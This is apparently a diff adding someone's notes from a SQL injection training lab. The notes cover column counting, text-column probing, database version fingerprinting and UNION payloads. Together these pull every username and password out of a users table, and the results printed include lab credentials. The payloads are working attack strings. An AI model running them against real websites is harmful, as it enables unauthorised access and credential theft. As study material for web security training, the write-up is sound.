@@ -1,0 +1,77 @@
+Retrieving multiple values within a single column
+
+In the preceding example, suppose instead that the query only returns a single column.
+
+You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+' UNION SELECT username || '~' || password FROM users--
+This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.
+
+The results from the query will let you read all of the usernames and passwords, for example:
+
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+Note that different databases use different syntax to perform string concatenation.
+
+
+find the number of columns,
+
+' order by 1 --
+' order by 2 --
+' order by 3 --
+
+there are 2 columns
+
+find the column with text
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+
+column 2 has text values
+
+retrieve data from the tbles
+
+USERNAMES :
+' UNION SELECT NULL, username FROM users-- 
+this gets the usernames
+
+Passwords
+' UNION SELECT NULL, password FROM users--
+
+combine the two querries
+
+String concatenation
+You can concatenate together multiple strings to make a single string.
+Oracle	'foo'||'bar'
+Microsoft	'foo'+'bar'
+PostgreSQL	'foo'||'bar'
+MySQL	'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+
+get the database version
+You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+
+Oracle	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft	SELECT @@version
+PostgreSQL	SELECT version()
+MySQL	SELECT @@version
+
+payload - 
+' UNION SELECT NULL, @@version FROM users-- 
+' UNION SELECT NULL, version() FROM users--
+the db is postgress - 
+PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+now that we have db version we can concatinate the string to output both username and passwords
+' UNION SELECT NULL, username || password FROM users--
+include separator to know where username ends and password starts
+' UNION SELECT NULL, username || '*' || password FROM users--
+results of the querry - 
+	
+	wiener*01v9w2qq1epgpma2j2zj
+	carlos*m7zp6f3m1nahxa5as4lx
+	administrator*yrw0r6wm3rjurnlry97w
+	
